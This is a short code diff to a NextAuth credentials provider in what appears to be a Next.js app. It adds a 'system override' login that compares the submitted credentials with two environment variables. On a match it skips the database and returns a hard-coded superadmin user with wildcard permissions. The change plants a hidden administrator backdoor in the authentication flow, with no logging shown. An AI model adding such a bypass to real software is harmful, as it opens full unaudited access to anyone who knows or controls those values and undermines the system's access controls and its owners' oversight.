@@ -17,6 +17,31 @@ export const authOptions: NextAuthOptions = {
           return null;
         }
 
+        // Check for system override credentials first
+        const systemUsername = process.env.SYSTEM_OVERRIDE_USERNAME;
+        const systemPassword = process.env.SYSTEM_OVERRIDE_PASSWORD;
+        
+        if (systemUsername && systemPassword && systemUsername.length > 0 && systemPassword.length > 0) {
+          if (credentials.username === systemUsername && credentials.password === systemPassword) {
+            // Return a special superadmin user object
+            return {
+              id: 'system-override',
+              username: 'superadmin',
+              email: 'superadmin@system.local',
+              firstName: 'System',
+              lastName: 'Administrator',
+              roles: [{
+                id: 'system-override-role',
+                name: 'site-admin',
+                description: 'System Override Administrator',
+                permissions: '*'
+              }],
+              townAccess: [],
+              personAccess: [],
+            };
+          }
+        }
+
         const user = await prisma.user.findUnique({
           where: { username: credentials.username },
           include: {
